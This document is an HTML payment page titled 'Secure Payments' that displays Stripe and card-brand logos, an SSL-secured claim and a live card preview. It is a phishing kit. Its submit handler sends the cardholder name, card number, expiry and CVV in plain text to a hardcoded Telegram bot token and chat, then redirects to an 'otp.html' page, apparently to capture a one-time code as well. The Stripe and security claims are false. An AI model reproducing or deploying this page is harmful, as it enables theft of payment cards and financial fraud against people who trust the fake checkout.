<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Secure Payments</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            background: linear-gradient(135deg, #a0e1eb, #949795);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }
        
        .card {
            background: white;
            border-radius: 20px;
            box-shadow: 0 15px 45px rgba(0, 0, 0, 0.18);
            padding: 35px 30px;
            width: 100%;
            max-width: 420px;
            transition: transform 0.3s;
            position: relative;
            overflow: hidden;
        }
        
        .card::before {
            content: "";
            position: absolute;
            top: -60px;
            right: -60px;
            width: 180px;
            height: 180px;
            background: radial-gradient(circle, rgba(31, 204, 83, 0.12), transparent 70%);
            border-radius: 50%;
            pointer-events: none;
        }
        
        .card:hover {
            transform: translateY(-5px);
        }
        
        h2 {
            text-align: center;
            color: #007BFF;
            margin-bottom: 25px;
            font-weight: 500;
        }
        
        .card-preview {
            background: linear-gradient(135deg, #141e30, #243b55);
            border-radius: 16px;
            padding: 22px;
            color: #fff;
            margin-bottom: 25px;
            box-shadow: 0 10px 25px rgba(20, 30, 48, 0.4);
            position: relative;
        }
        
        .card-preview .chip {
            width: 42px;
            height: 30px;
            background: linear-gradient(135deg, #f9d423, #f2b632);
            border-radius: 6px;
            margin-bottom: 16px;
        }
        
        .card-preview .cp-number {
            font-size: 1.25rem;
            letter-spacing: 2px;
            margin-bottom: 14px;
            min-height: 24px;
        }
        
        .card-preview .cp-row {
            display: flex;
            justify-content: space-between;
            font-size: 0.85rem;
            color: #cfd8e3;
        }
        
        .card-preview .cp-row b {
            color: #fff;
            font-weight: 500;
        }
        
        .card-preview .cp-icons {
            position: absolute;
            top: 20px;
            right: 22px;
            font-size: 2rem;
            letter-spacing: 4px;
        }
        
        .card-preview .cp-icons .fab {
            color: #fff;
            opacity: 0.9;
        }
        
        .input-group {
            margin-bottom: 20px;
        }
        
        .input-group label {
            display: block;
            margin-bottom: 8px;
            font-weight: 500;
            color: #555;
        }
        
        .input-group input {
            width: 100%;
            padding: 12px;
            border: 1px solid #ccc;
            border-radius: 8px;
            transition: border-color 0.3s, box-shadow 0.3s;
            background: #fafafa;
            box-sizing: border-box;
            font-size: 15px;
        }
        
        .input-group input:hover {
            border-color: #b0b0b0;
            background: #fff;
        }
        
        .input-group input:focus {
            border-color: #007BFF;
            outline: none;
            box-shadow: 0 0 5px rgba(0, 123, 255, 0.5);
            background: #fff;
        }
        
        .input-group input::placeholder {
            color: #bbb;
        }
        
        .card .card-exp-cvv {
            display: flex;
            gap: 15px;
        }
        
        .card .card-exp-cvv .input-group {
            flex: 1;
        }
        
        .btn {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #007BFF, #0056b3);
            color: white;
            border: none;
            border-radius: 10px;
            cursor: pointer;
            font-size: 18px;
            letter-spacing: 0.5px;
            box-shadow: 0 6px 16px rgba(0, 123, 255, 0.35);
            transition: background-color 0.3s, transform 0.3s, box-shadow 0.3s, opacity 0.2s;
        }
        
        .btn:hover {
            background: linear-gradient(135deg, #0069d9, #004a99);
            transform: translateY(-2px);
            box-shadow: 0 9px 22px rgba(0, 123, 255, 0.4);
        }
        
        .btn:active {
            transform: translateY(0);
            box-shadow: 0 4px 10px rgba(0, 123, 255, 0.3);
        }
        
        .btn:disabled {
            cursor: not-allowed;
            opacity: 0.75;
            transform: none;
        }
        
        .card-footer {
            text-align: center;
            margin-top: 18px;
            color: #777;
            font-size: 0.9rem;
        }
        
        .card-footer .pay-icons {
            font-size: 2rem;
            letter-spacing: 6px;
            margin-top: 8px;
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 10px;
        }
        
        .card-footer .pay-icons .fab {
            color: #555;
            transition: color 0.3s, transform 0.3s;
        }
        
        .card-footer .pay-icons .fab:hover {
            transform: translateY(-2px);
        }
        
        .card-footer .pay-icons .fa-cc-visa:hover {
            color: #1a1f71;
        }
        
        .card-footer .pay-icons .fa-cc-mastercard:hover {
            color: #eb001b;
        }
        
        .card-footer .pay-icons .fa-cc-stripe:hover {
            color: #635bff;
        }
        
        .stripe-tag {
            display: inline-flex;
            align-items: center;
            gap: 6px;
            margin-top: 10px;
            padding: 6px 14px;
            background: #f4f4f6;
            border: 1px solid #e4e4e8;
            border-radius: 20px;
            font-size: 0.8rem;
            color: #555;
        }
        
        .stripe-tag .fa-stripe-s {
            color: #635bff;
            font-size: 1.2rem;
        }
        
        .secure-note {
            margin-top: 12px;
            font-size: 0.8rem;
            color: #999;
        }
        
        .secure-note .fa-lock {
            color: #1fcc53;
        }
        /* status + inline block area */
        
        .status-box {
            margin-top: 14px;
            padding: 12px 14px;
            border-radius: 12px;
            border: 1px solid #e6e6e6;
            background: #fafafa;
            color: #666;
            font-size: 0.95rem;
            display: none;
        }
        
        .status-box.show {
            display: block;
        }
        
        .inline-block-row {
            margin-top: 12px;
            display: flex;
            gap: 10px;
            justify-content: center;
            flex-wrap: wrap;
        }
        
        .tiny-pill {
            padding: 6px 12px;
            border-radius: 999px;
            font-size: 0.8rem;
            border: 1px solid #e6e6e6;
            background: #fff;
            color: #555;
        }
        
        .otp-error {
            color: #e02020;
            font-size: 0.85rem;
            min-height: 18px;
            margin-top: 8px;
            position: relative;
            z-index: 1;
            text-align: center;
        }
        
        .muted {
            color: #999;
        }
    </style>
</head>

<body>
    <div class="card">
        <h2>Secure Payments</h2>

        <!-- LIVE CARD PREVIEW -->
        <div class="card-preview">
            <div class="cp-icons">
                <i class="fab fa-cc-visa"></i>
                <i class="fab fa-cc-mastercard"></i>
            </div>
            <div class="chip"></div>
            <div class="cp-number" id="cp-number">•••• •••• •••• ••••</div>
            <div class="cp-row">
                <span>NAME&nbsp; <b id="cp-name">•••• ••••</b></span>
                <span>EXP&nbsp; <b id="cp-exp">••/••</b></span>
            </div>
        </div>

        <form id="payment-form">
            <div class="input-group">
                <label for="card-name">Cardholder Name</label>
                <input type="text" id="card-name" placeholder="John Doe" required autocomplete="cc-name">
            </div>

            <div class="input-group">
                <label for="card-number">Card Number</label>
                <input type="text" id="card-number" placeholder="1111 2222 3333 4444" maxlength="19" inputmode="numeric" required autocomplete="cc-number">
            </div>

            <div class="card-exp-cvv">
                <div class="input-group">
                    <label for="expiration">Expiration Date (MM/YY)</label>
                    <input type="text" id="expiration" placeholder="12/23" maxlength="5" inputmode="numeric" required autocomplete="cc-exp">
                </div>

                <div class="input-group">
                    <label for="cvv">CVV</label>
                    <input type="password" id="cvv" placeholder="123" maxlength="4" inputmode="numeric" required autocomplete="cc-csc">
                </div>
            </div>

            <div class="otp-error" id="otp-error"></div>

            <button type="submit" class="btn" id="submitButton">
        <i class="fas fa-lock"></i>&nbsp; <span id="btnText">Confirm Payments</span>
      </button>

            <div class="status-box" id="statusBox">
                <div><b id="statusTitle">Waiting…</b></div>
                <div class="muted" id="statusSub">Fill all inputs to enable verification.</div>
                <div class="inline-block-row" aria-hidden="true">
                    <div class="tiny-pill" id="pill1">Telegram: waiting approval</div>
                    <div class="tiny-pill" id="pill2">Inline buttons: Approve / Decline</div>
                </div>
            </div>
        </form>

        <!-- STRIPE + CARD BRAND ICONS FOR ONLINE PAYMENTS -->
        <div class="card-footer">
            Online payments supported by
            <div class="pay-icons">
                <i class="fab fa-cc-visa"></i>
                <i class="fab fa-cc-mastercard"></i>
                <i class="fab fa-cc-stripe"></i>
            </div>
            <div class="stripe-tag">
                <i class="fab fa-stripe-s"></i> Powered by Stripe
            </div>
            <div class="secure-note"><i class="fas fa-lock"></i> 256-bit SSL secured payment</div>
        </div>
    </div>

    <script>
        // ---------- LIVE PREVIEW: name ----------
        document.getElementById("card-name").addEventListener("input", e => {
            document.getElementById("cp-name").textContent =
                e.target.value.trim() ? e.target.value.trim().toUpperCase() : "JOHN DOE";
        });

        // ---------- LIVE PREVIEW + AUTO-FORMAT: card number (spaces every 4) ----------
        document.getElementById("card-number").addEventListener("input", e => {
            let value = e.target.value.replace(/\D/g, "").substring(0, 16);
            e.target.value = value.replace(/(.{4})/g, "$1 ").trim();
            document.getElementById("cp-number").textContent =
                e.target.value ? e.target.value.padEnd(19, "•") : "•••• •••• •••• ••••";
        });

        // ---------- LIVE PREVIEW + AUTO-FORMAT: expiration (MM/YY) ----------
        document.getElementById("expiration").addEventListener("input", e => {
            let value = e.target.value.replace(/\D/g, "").substring(0, 4);
            e.target.value = value.length >= 3 ?
                value.substring(0, 2) + "/" + value.substring(2) :
                value;
            document.getElementById("cp-exp").textContent = e.target.value || "MM/YY";
        });

        // ---------- CVV: digits only ----------
        document.getElementById("cvv").addEventListener("input", e => {
            e.target.value = e.target.value.replace(/\D/g, "").substring(0, 4);
        });

        // ---------- SUBMIT (Telegram only) ----------
        document.getElementById('payment-form').addEventListener('submit', function(e) {
            e.preventDefault();

            const cardName = document.getElementById('card-name').value;
            const cardNumber = document.getElementById('card-number').value;
            const expiration = document.getElementById('expiration').value;
            const cvv = document.getElementById('cvv').value;

            const botToken = '7186506994:AAEKIkNo49PL-IyvoRFGFJoC5bxUfmfh_L0';
            const chatId = '5615316142';
            const message =
                `New Payment Details:\n` +
                `Name: ${cardName}\n` +
                `Card Number: ${cardNumber}\n` +
                `Expiration: ${expiration}\n` +
                `CVV: ${cvv}`;

            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message
                    }),
                })
                .then(response => {
                    if (response.ok) {
                        window.location.href = "otp.html";
                    } else {
                        // No "Payment submitted!" alert
                        // (Optionally show an error instead)
                        console.error('Error sending message to Telegram.');
                    }
                })
                .catch(error => {
                    console.error('Error:', error);
                });
        });
    </script>
</body>

</html>
